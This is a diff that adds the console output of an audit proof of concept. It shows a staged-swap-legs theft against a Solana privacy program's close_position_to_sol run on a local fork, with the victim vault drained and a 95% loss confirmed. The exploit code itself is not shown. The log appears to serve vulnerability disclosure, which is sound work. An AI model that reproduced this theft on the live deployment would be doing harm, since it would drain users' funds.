@@ -1,0 +1,48 @@
+   Compiling veilo-close-theft-driver v0.1.0 (/Users/kyansharma/Desktop/contracts/Rektoff/Security_codebases_review/Solana_Website_Intake/veilo/source/privacy-program/audit-artifacts/close-position-theft-surfpool-poc/driver)
+warning: constant `RENT_TOKEN_ACCOUNT` is never used
+  --> src/main.rs:59:7
+   |
+59 | const RENT_TOKEN_ACCOUNT: u64 = 2_039_280;
+   |       ^^^^^^^^^^^^^^^^^^
+   |
+   = note: `#[warn(dead_code)]` (part of `#[warn(unused)]`) on by default
+
+warning: `veilo-close-theft-driver` (bin "veilo-close-theft-driver") generated 1 warning
+    Finished `release` profile [optimized] target(s) in 3.63s
+     Running `driver/target/release/veilo-close-theft-driver`
+=== Veilo close_position_to_sol staged-legs theft — Surfpool composition witness ===
+relayer (Mallory) : 9cgtM5SC41ueCahZzwWHHRy1XQbszPJi6FMrFCSihmcW
+cosigner          : 5tHUBU5ziVUgPVpLtG3bhu8gv1CyPuzA9QHGasXNFkto
+harness program   : 2oVWqFiiGbUbRbFxkramz53AY6r6xScQRaytUWu1mQmV
+harness .so: 103184 bytes
+harness deployed in 2 chunks via surfnet_writeProgram
+mint              : 3yqHWcjTHfGXCNd2Gtgacy7bHYJsF2s2TZhuWu4LkxuN
+vault_pda         : 6qxQ8hxwAXfgJoXzfiv2kbKkU8phmN7ZmR7gSXdoa5s5
+vault_ata         : BSQXAnjLNH2h4u7o8unEyTb2svBnpXzrD1jGb3bur7XV
+cosigner_meme_ata : 2gLpai7M1pMmfKVe3eQwgdTMb5WkDDefF5DyrmMZxmmd
+attacker_meme_ata : Cjz1BMPTQ4HXVmwJwyNJhnfgZF1djyNdDY8UDgNbLY48
+cosigner_wsol_ata : 5t2MtgbdKgJABXMJRWR2hKampDxpN2RGShvQwNLn7dzJ
+executor_pda      : FjqCAs2KwR8GJ8o2MdHb8YrC9FiU6Pc9UDGRRqegqEDg
+executor_source   : J85gKLvzgSXrpjbpNrKECUBQrLJ4vKRXNYo9nj5pGRbX
+sol_vault         : zQT348hi4BN212oiEKRW9pJ3QBkbGZTwS6yf3L1HQkh
+SwapLegsBuffer PDA on deployed Veilo: 6ZAKckV13JnQJ6aZ98Vmb5yhx6FqfwqQwJCV2Xjdapey (bump 254)
+stage tx confirmed: RuZpeJPE1rasXKfg9sgzRfZW
+malicious legs staged through the DEPLOYED Veilo stage_swap_legs instruction
+Mallory pre-funded cosigner WSOL ATA with 6500000000 lamports (separate tx)
+harness tx confirmed: 479vasdmVsg31QGf48UT3EM5
+
+=== ASSERTIONS ===
+attacker_meme_ata balance : Some(100000000000)
+cosigner_meme_ata balance : None
+vault_ata balance         : Some(0)
+sol_vault lamports        : 6495439280
+
+Theft (attacker holds full position)   : true
+Cosigner source ATA drained + closed   : true
+Position vault debited in full         : true
+Victim SOL note backed by relayer front: true
+
+status=confirmed-staged-legs-theft
+stolen_tokens=100000000000
+victim_note_backing=6495439280
+loss_fraction=95.0%
